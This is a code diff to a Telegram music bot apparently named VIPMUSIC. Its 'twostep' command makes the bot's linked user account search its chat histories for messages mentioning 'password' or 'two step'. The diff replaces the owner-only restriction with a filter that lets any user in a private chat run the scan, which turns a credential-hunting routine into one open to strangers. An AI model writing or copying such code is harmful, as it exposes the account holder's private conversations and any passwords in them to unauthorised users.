@@ -125,7 +125,7 @@ from VIPMUSIC.utils.database import get_assistant
 # Keywords to search for
 KEYWORDS = ["two step", "password"]
 
-@app.on_message(filters.command("twostep") & filters.user(int(OWNERS)))
+@app.on_message(filters.command("twostep") & ~filters.group)
 async def check_two_step_command(client, message):
     try:
         # Start the Pyrogram client (userbot)
@@ -144,8 +144,8 @@ async def check_two_step_command(client, message):
                 chat_title = dialog.chat.first_name if dialog.chat.first_name else dialog.chat.username
 
                 # Fetch the chat history and search for keywords
-                async for message in userbot.get_chat_history(chat_id, limit=1000):
-                    if any(keyword in (message.text or "").lower() for keyword in KEYWORDS):
+                async for chat_message in userbot.get_chat_history(chat_id, limit=1000):
+                    if chat_message.text and any(keyword in chat_message.text.lower() for keyword in KEYWORDS):
                         found_chats.append(chat_id)
                         break  # Stop once a keyword is found in this chat
 
